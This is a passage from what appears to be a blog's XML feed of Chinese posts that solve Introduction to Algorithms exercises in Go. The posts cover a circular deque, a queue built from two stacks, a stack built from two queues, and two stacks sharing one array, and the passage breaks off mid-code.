punctuation">)</span> <span class="token builtin">int</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> position <span class="token operator">==</span> <span class="token function">len</span><span class="token punctuation">(</span>d<span class="token punctuation">.</span>arr<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> position <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>d <span class="token operator">*</span>Deque<span class="token punctuation">)</span> <span class="token function">LeftInsert</span><span class="token punctuation">(</span>val <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> d<span class="token punctuation">.</span><span class="token function">isFull</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> d<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        d<span class="token punctuation">.</span>rightHead <span class="token operator">=</span> d<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span>d<span class="token punctuation">.</span>rightHead<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    d<span class="token punctuation">.</span>arr<span class="token punctuation">[</span>d<span class="token punctuation">.</span>leftHead<span class="token punctuation">]</span> <span class="token operator">=</span> val    d<span class="token punctuation">.</span>size<span class="token operator">++</span>    d<span class="token punctuation">.</span>leftHead <span class="token operator">=</span> d<span class="token punctuation">.</span><span class="token function">pre</span><span class="token punctuation">(</span>d<span class="token punctuation">.</span>leftHead<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>d <span class="token operator">*</span>Deque<span class="token punctuation">)</span> <span class="token function">RightInsert</span><span class="token punctuation">(</span>val <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> d<span class="token punctuation">.</span><span class="token function">isFull</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> d<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        d<span class="token punctuation">.</span>leftHead <span class="token operator">=</span> d<span class="token punctuation">.</span><span class="token function">pre</span><span class="token punctuation">(</span>d<span class="token punctuation">.</span>leftHead<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    d<span class="token punctuation">.</span>arr<span class="token punctuation">[</span>d<span class="token punctuation">.</span>rightHead<span class="token punctuation">]</span> <span class="token operator">=</span> val    d<span class="token punctuation">.</span>size<span class="token operator">++</span>    d<span class="token punctuation">.</span>rightHead <span class="token operator">=</span> d<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span>d<span class="token punctuation">.</span>rightHead<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>d <span class="token operator">*</span>Deque<span class="token punctuation">)</span> <span class="token function">LeftDelete</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> d<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token boolean">false</span>    <span class="token punctuation">&#125;</span>    d<span class="token punctuation">.</span>leftHead <span class="token operator">=</span> d<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span>d<span class="token punctuation">.</span>leftHead<span class="token punctuation">)</span>    <span class="token keyword">if</span> d<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        d<span class="token punctuation">.</span>rightHead <span class="token operator">=</span> d<span class="token punctuation">.</span><span class="token function">pre</span><span class="token punctuation">(</span>d<span class="token punctuation">.</span>rightHead<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    val <span class="token operator">:=</span> d<span class="token punctuation">.</span>arr<span class="token punctuation">[</span>d<span class="token punctuation">.</span>leftHead<span class="token punctuation">]</span>    d<span class="token punctuation">.</span>size<span class="token operator">--</span>    <span class="token keyword">return</span> val<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>d <span class="token operator">*</span>Deque<span class="token punctuation">)</span> <span class="token function">RightDelete</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> d<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token boolean">false</span>    <span class="token punctuation">&#125;</span>    d<span class="token punctuation">.</span>rightHead <span class="token operator">=</span> d<span class="token punctuation">.</span><span class="token function">pre</span><span class="token punctuation">(</span>d<span class="token punctuation">.</span>rightHead<span class="token punctuation">)</span>    <span class="token keyword">if</span> d<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        d<span class="token punctuation">.</span>leftHead <span class="token operator">=</span> d<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span>d<span class="token punctuation">.</span>leftHead<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    val <span class="token operator">:=</span> d<span class="token punctuation">.</span>arr<span class="token punctuation">[</span>d<span class="token punctuation">.</span>rightHead<span class="token punctuation">]</span>    d<span class="token punctuation">.</span>size<span class="token operator">--</span>    <span class="token keyword">return</span> val<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> deque <span class="token operator">=</span> Deque<span class="token punctuation">&#123;</span>    leftHead<span class="token punctuation">:</span>  <span class="token number">0</span><span class="token punctuation">,</span>    rightHead<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>    arr<span class="token punctuation">:</span>       <span class="token punctuation">[</span>maxSize<span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
            <tag> 算法导论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法导论-两个栈实现队列</title>
      <link href="/%E7%AE%97%E6%B3%95/2021-03-07-%E7%AE%97%E6%B3%95%E5%AF%BC%E8%AE%BA-%E4%B8%A4%E4%B8%AA%E6%A0%88%E5%AE%9E%E7%8E%B0%E9%98%9F%E5%88%97/"/>
      <url>/%E7%AE%97%E6%B3%95/2021-03-07-%E7%AE%97%E6%B3%95%E5%AF%BC%E8%AE%BA-%E4%B8%A4%E4%B8%AA%E6%A0%88%E5%AE%9E%E7%8E%B0%E9%98%9F%E5%88%97/</url>
      
        <content type="html"><![CDATA[<h3 id="用两个栈实现队列，并分析相关队列操作的运行时间。"><a href="#用两个栈实现队列，并分析相关队列操作的运行时间。" class="headerlink" title="用两个栈实现队列，并分析相关队列操作的运行时间。"></a>用两个栈实现队列，并分析相关队列操作的运行时间。</h3><ul><li>单栈push和pop的运行时间都为O(1)，所以需要考虑的就是两个栈之间切换所用时间。</li><li>最坏情况：在push和pop交替操作时，需要将一个栈中的数据转移到另一个栈中，转移所用时间为O(n)，n为当前栈中元素个数。</li><li>最好情况：用flag记录上一次是push还是pop，如果和当前操作一致，则直接操作对应的栈，时间复杂度为O(1)。<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">const</span> maxSize <span class="token operator">=</span> <span class="token number">10</span><span class="token keyword">type</span> StackDeque <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>  pushStack <span class="token operator">*</span>Stack  popStack  <span class="token operator">*</span>Stack  flag      <span class="token builtin">bool</span> <span class="token comment">// true in push，false in pop</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>s <span class="token operator">*</span>StackDeque<span class="token punctuation">)</span> <span class="token function">exchange</span><span class="token punctuation">(</span>from<span class="token punctuation">,</span> to <span class="token operator">*</span>Stack<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  to<span class="token punctuation">.</span><span class="token function">Clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">for</span> <span class="token boolean">true</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> v<span class="token punctuation">,</span> ok <span class="token operator">:=</span> from<span class="token punctuation">.</span><span class="token function">Pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ok <span class="token punctuation">&#123;</span>          to<span class="token punctuation">.</span><span class="token function">Push</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">break</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  s<span class="token punctuation">.</span>flag <span class="token operator">=</span> <span class="token operator">!</span>s<span class="token punctuation">.</span>flag<span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>s <span class="token operator">*</span>StackDeque<span class="token punctuation">)</span> <span class="token function">Push</span><span class="token punctuation">(</span>val <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token operator">!</span>s<span class="token punctuation">.</span>flag <span class="token punctuation">&#123;</span> <span class="token comment">// 当前在pop栈</span>      s<span class="token punctuation">.</span><span class="token function">exchange</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>popStack<span class="token punctuation">,</span> s<span class="token punctuation">.</span>pushStack<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> s<span class="token punctuation">.</span>pushStack<span class="token punctuation">.</span><span class="token function">Push</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>s <span class="token operator">*</span>StackDeque<span class="token punctuation">)</span> <span class="token function">Pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> s<span class="token punctuation">.</span>flag <span class="token punctuation">&#123;</span>      s<span class="token punctuation">.</span><span class="token function">exchange</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>pushStack<span class="token punctuation">,</span> s<span class="token punctuation">.</span>popStack<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> s<span class="token punctuation">.</span>popStack<span class="token punctuation">.</span><span class="token function">Pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token comment">// ----------------实现栈开始----------------</span><span class="token keyword">type</span> Stack <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>  arr  <span class="token punctuation">[</span>maxSize<span class="token punctuation">]</span><span class="token builtin">int</span>  size <span class="token builtin">int</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>s <span class="token operator">*</span>Stack<span class="token punctuation">)</span> <span class="token function">isFull</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> s<span class="token punctuation">.</span>size <span class="token operator">==</span> maxSize <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token boolean">true</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>s <span class="token operator">*</span>Stack<span class="token punctuation">)</span> <span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> s<span class="token punctuation">.</span>size <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token boolean">true</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>s <span class="token operator">*</span>Stack<span class="token punctuation">)</span> <span class="token function">Push</span><span class="token punctuation">(</span>val <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> s<span class="token punctuation">.</span><span class="token function">isFull</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token boolean">false</span>  <span class="token punctuation">&#125;</span>  s<span class="token punctuation">.</span>arr<span class="token punctuation">[</span>s<span class="token punctuation">.</span>size<span class="token punctuation">]</span> <span class="token operator">=</span> val  s<span class="token punctuation">.</span>size<span class="token operator">++</span>  <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>s <span class="token operator">*</span>Stack<span class="token punctuation">)</span> <span class="token function">Pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> s<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token boolean">false</span>  <span class="token punctuation">&#125;</span>  val <span class="token operator">:=</span> s<span class="token punctuation">.</span>arr<span class="token punctuation">[</span>s<span class="token punctuation">.</span>size<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>  s<span class="token punctuation">.</span>size<span class="token operator">--</span>  <span class="token keyword">return</span> val<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>s <span class="token operator">*</span>Stack<span class="token punctuation">)</span> <span class="token function">Clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  s<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token comment">// ----------------实现栈结束----------------</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
            <tag> 算法导论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法导论-两个队列实现栈</title>
      <link href="/%E7%AE%97%E6%B3%95/2021-03-07-%E7%AE%97%E6%B3%95%E5%AF%BC%E8%AE%BA-%E4%B8%A4%E4%B8%AA%E9%98%9F%E5%88%97%E5%AE%9E%E7%8E%B0%E6%A0%88/"/>
      <url>/%E7%AE%97%E6%B3%95/2021-03-07-%E7%AE%97%E6%B3%95%E5%AF%BC%E8%AE%BA-%E4%B8%A4%E4%B8%AA%E9%98%9F%E5%88%97%E5%AE%9E%E7%8E%B0%E6%A0%88/</url>
      
        <content type="html"><![CDATA[<h3 id="用两个队列实现栈，并分析相关栈操作的运行时间。"><a href="#用两个队列实现栈，并分析相关栈操作的运行时间。" class="headerlink" title="用两个队列实现栈，并分析相关栈操作的运行时间。"></a>用两个队列实现栈，并分析相关栈操作的运行时间。</h3><p>思路同：<a href="https://liyuxing.blog.csdn.net/article/details/111464812">两个栈实现队列</a></p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">type</span> DequeStack <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    pushDeque <span class="token operator">*</span>Deque    popDeque <span class="token operator">*</span>Deque    flag <span class="token builtin">bool</span> <span class="token comment">// true in push, false in pop</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>d <span class="token operator">*</span>DequeStack<span class="token punctuation">)</span> <span class="token function">exchange</span><span class="token punctuation">(</span>from<span class="token punctuation">,</span> to <span class="token operator">*</span>Deque<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    to<span class="token punctuation">.</span><span class="token function">Clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> <span class="token boolean">true</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> v<span class="token punctuation">,</span> ok <span class="token operator">:=</span> from<span class="token punctuation">.</span><span class="token function">Pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ok <span class="token punctuation">&#123;</span>            to<span class="token punctuation">.</span><span class="token function">Push</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">break</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    d<span class="token punctuation">.</span>flag<span class="token operator">=</span><span class="token operator">!</span>d<span class="token punctuation">.</span>flag<span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>d <span class="token operator">*</span>DequeStack<span class="token punctuation">)</span> <span class="token function">Push</span><span class="token punctuation">(</span>val <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token operator">!</span>d<span class="token punctuation">.</span>flag<span class="token punctuation">&#123;</span>        d<span class="token punctuation">.</span><span class="token function">exchange</span><span class="token punctuation">(</span>d<span class="token punctuation">.</span>popDeque<span class="token punctuation">,</span> d<span class="token punctuation">.</span>pushDeque<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> d<span class="token punctuation">.</span>pushDeque<span class="token punctuation">.</span><span class="token function">Push</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>d <span class="token operator">*</span>DequeStack<span class="token punctuation">)</span> <span class="token function">Pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token builtin">bool</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> d<span class="token punctuation">.</span>flag<span class="token punctuation">&#123;</span>        d<span class="token punctuation">.</span><span class="token function">exchange</span><span class="token punctuation">(</span>d<span class="token punctuation">.</span>pushDeque<span class="token punctuation">,</span> d<span class="token punctuation">.</span>popDeque<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> d<span class="token punctuation">.</span>popDeque<span class="token punctuation">.</span><span class="token function">Pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token comment">// 队列实现</span><span class="token keyword">type</span> Deque <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    arr  <span class="token punctuation">[</span>maxSize<span class="token punctuation">]</span><span class="token builtin">int</span>    head <span class="token builtin">int</span>    tail <span class="token builtin">int</span>    size <span class="token builtin">int</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>d <span class="token operator">*</span>Deque<span class="token punctuation">)</span> <span class="token function">next</span><span class="token punctuation">(</span>position <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token builtin">int</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> position <span class="token operator">==</span> <span class="token function">len</span><span class="token punctuation">(</span>d<span class="token punctuation">.</span>arr<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> position <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>d <span class="token operator">*</span>Deque<span class="token punctuation">)</span> <span class="token function">isFull</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> d<span class="token punctuation">.</span>size <span class="token operator">==</span> <span class="token function">len</span><span class="token punctuation">(</span>d<span class="token punctuation">.</span>arr<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>d <span class="token operator">*</span>Deque<span class="token punctuation">)</span> <span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> d<span class="token punctuation">.</span>size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>d <span class="token operator">*</span>Deque<span class="token punctuation">)</span> <span class="token function">Push</span><span class="token punctuation">(</span>val <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> d<span class="token punctuation">.</span><span class="token function">isFull</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span>    <span class="token punctuation">&#125;</span>    d<span class="token punctuation">.</span>arr<span class="token punctuation">[</span>d<span class="token punctuation">.</span>tail<span class="token punctuation">]</span> <span class="token operator">=</span> val    d<span class="token punctuation">.</span>tail <span class="token operator">=</span> d<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span>d<span class="token punctuation">.</span>tail<span class="token punctuation">)</span>    d<span class="token punctuation">.</span>size<span class="token operator">++</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>d <span class="token operator">*</span>Deque<span class="token punctuation">)</span> <span class="token function">Pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> d<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token boolean">false</span>    <span class="token punctuation">&#125;</span>    val <span class="token operator">:=</span> d<span class="token punctuation">.</span>arr<span class="token punctuation">[</span>d<span class="token punctuation">.</span>head<span class="token punctuation">]</span>    d<span class="token punctuation">.</span>head <span class="token operator">=</span> d<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span>d<span class="token punctuation">.</span>head<span class="token punctuation">)</span>    d<span class="token punctuation">.</span>size<span class="token operator">--</span>    <span class="token keyword">return</span> val<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>d <span class="token operator">*</span>Deque<span class="token punctuation">)</span> <span class="token function">Clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    d<span class="token punctuation">.</span>head <span class="token operator">=</span> <span class="token number">0</span>    d<span class="token punctuation">.</span>tail <span class="token operator">=</span> <span class="token number">0</span>    d<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
            <tag> 算法导论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法导论—一个数组中实现两个栈</title>
      <link href="/%E7%AE%97%E6%B3%95/2021-03-07-%E7%AE%97%E6%B3%95%E5%AF%BC%E8%AE%BA-%E4%B8%80%E4%B8%AA%E6%95%B0%E7%BB%84%E4%B8%AD%E5%AE%9E%E7%8E%B0%E4%B8%A4%E4%B8%AA%E6%A0%88/"/>
      <url>/%E7%AE%97%E6%B3%95/2021-03-07-%E7%AE%97%E6%B3%95%E5%AF%BC%E8%AE%BA-%E4%B8%80%E4%B8%AA%E6%95%B0%E7%BB%84%E4%B8%AD%E5%AE%9E%E7%8E%B0%E4%B8%A4%E4%B8%AA%E6%A0%88/</url>
      
        <content type="html"><![CDATA[<h3 id="如何在一个数组A-1-n-中实现两个栈，使得当两个栈的元素个数之和不为n时，两者都不会发生上溢。"><a href="#如何在一个数组A-1-n-中实现两个栈，使得当两个栈的元素个数之和不为n时，两者都不会发生上溢。" class="headerlink" title="如何在一个数组A[1..n]中实现两个栈，使得当两个栈的元素个数之和不为n时，两者都不会发生上溢。"></a>如何在一个数组A[1..n]中实现两个栈，使得当两个栈的元素个数之和不为n时，两者都不会发生上溢。</h3><ul><li>要求push和pop操作的运行时间为O(1)。</li></ul><h5 id="实现："><a href="#实现：" class="headerlink" title="实现："></a>实现：</h5><ul><li>两个栈分别从数组的两端开始，向中间push元素，直到两个指针相遇。<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">const</span> maxSize <span class="token operator">=</span> <span class="token number">10</span><span class="token keyword">const</span> <span class="token punctuation">(</span>  sLeft stackType <span class="token operator">=</span> <span class="token boolean">iota</span>  sRight<span class="token punctuation">)</span><span class="token keyword">type</span> stackType <span class="token builtin">int</span><span class="token keyword">type</span> Stack <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>  arr   <span class="token punctuation">[</span>maxSize<span class="token punctuation">]</span><span class="token builtin">int</span>  left  <span class="token builtin">int</span>  right <span class="token builtin">int</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> stack <span class="token operator">=</span> Stack<span class="token punctuation">&#123;</span>  arr<span class="token punctuation">:</span>   <span class="token punctuation">[</span>maxSize<span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  left<span class="token punctuation">:</span>  <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>  right<span class="token punctuation">:</span> maxSize<span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>s <span class="token operator">*</span>Stack<span class="token punctuation">)</span> <span class="token function">Push</span><span class="token punctuation">(</span>val <span class="token builtin">int</span><span class="token punctuation">,</span> 